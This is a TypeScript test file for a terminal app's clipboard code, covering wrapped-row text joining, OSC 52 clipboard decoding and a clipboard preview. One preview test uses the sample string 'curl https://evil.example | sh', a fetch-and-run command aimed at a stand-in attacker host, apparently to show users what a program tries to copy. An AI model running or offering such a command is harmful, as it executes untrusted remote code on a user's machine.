import { describe, expect, it } from "vitest";
import { bufferToText, decodeOsc52, type BufferLike } from "./clipboard";

function buffer(rows: [text: string, wrapped?: boolean][]): BufferLike {
  return {
    length: rows.length,
    getLine: (y) => {
      const row = rows[y];
      if (!row) return undefined;
      return {
        isWrapped: row[1] ?? false,
        translateToString: (trim?: boolean) => (trim ? row[0].replace(/\s+$/, "") : row[0]),
      };
    },
  };
}

describe("bufferToText", () => {
  it("joins soft-wrapped rows onto the previous row", () => {
    const b = buffer([["$ echo aaaa"], ["aaaaaaaaaa"], ["bbbb", true], ["done"]]);
    expect(bufferToText(b)).toBe("$ echo aaaa\naaaaaaaaaabbbb\ndone");
  });

  it("drops trailing spaces and trailing blank rows but keeps inner blank rows", () => {
    const b = buffer([["line1   "], [""], ["line3"], ["   "], [""]]);
    expect(bufferToText(b)).toBe("line1\n\nline3");
  });

  it("limits output to the requested row range", () => {
    const b = buffer([["a"], ["b"], ["c"], ["d"]]);
    expect(bufferToText(b, 1, 3)).toBe("b\nc");
    expect(bufferToText(b, -5, 99)).toBe("a\nb\nc\nd");
  });

  it("keeps a space that falls exactly on the wrap boundary", () => {
    // 折り返し前の行末の空白は本物の文字なので残す（論理行の末尾の空白だけを削る）
    const b = buffer([["hello     "], ["worldwide ", true], ["next line          "]]);
    expect(bufferToText(b)).toBe("hello     worldwide\nnext line");
    const b2 = buffer([["abc def gh"], ["ij", true]]);
    expect(bufferToText(b2)).toBe("abc def ghij");
    const b3 = buffer([["say hello "], ["world", true]]);
    expect(bufferToText(b3)).toBe("say hello world");
  });

  it("treats a wrapped first row as a normal row", () => {
    const b = buffer([["tail", true], ["next"]]);
    expect(bufferToText(b)).toBe("tail\nnext");
  });

  it("preserves Japanese text", () => {
    const b = buffer([["日本語の出力"], ["続き", true]]);
    expect(bufferToText(b)).toBe("日本語の出力続き");
  });
});

describe("decodeOsc52", () => {
  const b64 = (s: string) => btoa(String.fromCharCode(...new TextEncoder().encode(s)));

  it("decodes UTF-8 clipboard payloads", () => {
    expect(decodeOsc52("c;" + b64("hello"))).toBe("hello");
    expect(decodeOsc52(";" + b64("コピー\n2行目"))).toBe("コピー\n2行目");
  });

  it("ignores queries, empty data and malformed input", () => {
    expect(decodeOsc52("c;?")).toBeNull();
    expect(decodeOsc52("c;")).toBeNull();
    expect(decodeOsc52("no-separator")).toBeNull();
    // 区切りのない（ターゲット指定のない）データは、正しいbase64でも受け付けない
    expect(decodeOsc52("aGVsbG8=")).toBeNull();
    expect(decodeOsc52("c;!!!not-base64!!!")).toBeNull();
    // 不正なUTF-8バイト列は文字化けさせずに捨てる
    expect(decodeOsc52("c;" + btoa("\xff\xfe"))).toBeNull();
  });
});

describe("oscPreview", async () => {
  const { oscPreview } = await import("./components/TerminalView");
  it("shows a one-line head and the line count", () => {
    expect(oscPreview("curl https://evil.example | sh")).toBe("curl https://evil.example | sh");
    expect(oscPreview("line1\nline2\nline3")).toBe("line1 line2 line3（3行）");
    expect(oscPreview("x".repeat(80))).toBe("x".repeat(60) + "…");
  });
});
